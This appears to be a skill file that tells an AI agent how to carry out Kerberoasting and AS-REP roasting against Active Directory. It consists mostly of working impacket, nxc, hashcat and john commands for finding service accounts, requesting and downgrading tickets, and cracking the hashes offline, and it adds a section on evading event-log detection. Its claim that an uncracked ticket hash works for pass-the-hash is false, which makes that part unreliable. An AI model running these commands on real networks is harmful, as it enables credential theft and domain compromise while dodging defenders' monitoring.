---
name: kerberoast-attack
description: "Kerberoasting: requesting service tickets for accounts with SPNs, extracting them, and cracking offline. Use this skill when an account has a service principal name."
---

# Kerberoasting

## Overview

Any authenticated user can request a TGS for a service account. The ticket is encrypted with the account's NTLM hash — crackable offline.

## Find targets

```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC
nxc ldap DC -u user -p pass --kerberoasting kerb.txt
```

Filter for privileged accounts: `svc_` accounts in Domain Admins, or with `AdminCount=1`.

## Request and extract

```bash
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC -request -outputfile hashes.txt
```

Output format: `$krb5tgs$23$*user$DOMAIN$spn*$...`

## Crack

```bash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt rockyou.txt -r rules/best64.rule
john --format=krb5tgs hashes.txt --wordlist=rockyou.txt
```

`-m 13100` = RC4 (etype 23, fastest). `-m 19700` = AES256 (etype 18, much slower).

## Targeted roasting (AS-REP)

Accounts with `DONT_REQUIRE_PREAUTH` need no credentials to roast:

```bash
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip DC -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt
```

## Encryption downgrade

Requesting RC4 when AES is supported gives a faster crack. Some tools force etype 23:

```bash
impacket-GetUserSPNs domain/user:pass -dc-ip DC -request -request-etype 23
```

## Detection evasion

Kerberoasting generates 4769 events with RC4. Requesting AES tickets is quieter but slower to crack.

## Pitfalls

- Service accounts often have 25+ character passwords — cracking fails, but the hash is still useful for PtH if RC4.
- AES-only environments make cracking impractical.
- `GetUserSPNs` needs a valid domain credential.

## Verification

The cracked password must authenticate as the service account.
